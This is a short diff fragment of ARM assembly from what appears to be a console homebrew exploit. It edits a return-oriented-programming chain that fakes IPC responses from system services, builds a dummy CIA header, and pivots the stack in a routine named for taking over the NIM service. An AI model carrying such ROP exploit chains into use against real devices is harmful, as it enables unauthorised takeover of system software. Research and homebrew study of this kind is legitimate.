-	.word IPC_Desc_Buffer((.Lam_rop_section_end - .Lam_rop_section_start), IPC_BUFFER_W)
-	.word 0xBEEFBEEF
-.LFSFile_Read_PWD_Response_end:
-
-.LFSFile_Close_Response:
-	.word IPC_MakeHeader(0x808, 1, 0)
-	.word 0
-.LFSFile_Close_Response_end:
-
-.LDummyCiaHeader:
-	.word 0x2020
-	.word 0
-	.word 0xA00
-	.word 0x350
-	.word 0xb64
-	.word 0x0
-	.word 0x100000
-	.word 0x0
+.PS_VerifyRsaSha256Header_Response_end:
 
 .LNIM_0x5E_Response:
 	.word IPC_MakeHeader(0x5e, 2, 0)
@@ -460,7 +485,7 @@ NIMS_0x5E_ROP_TakeOver:
 	.word 0 @ r0 - USERBREAK_PANIC
 	.word ROP_SVCBREAK @ pc
 	@ shouldn't return, but just in case
-	.word ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed) @ r0
+	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)) @ r0
 	.word ROP_STACK_PIVOT @ pc
 
 	#define ROP_RECOVERY_ABSTRACT_ADDR(x) (ROP_STATICBUF_DESCINDEX2 + ((x) - .LROP_Service_Restore))
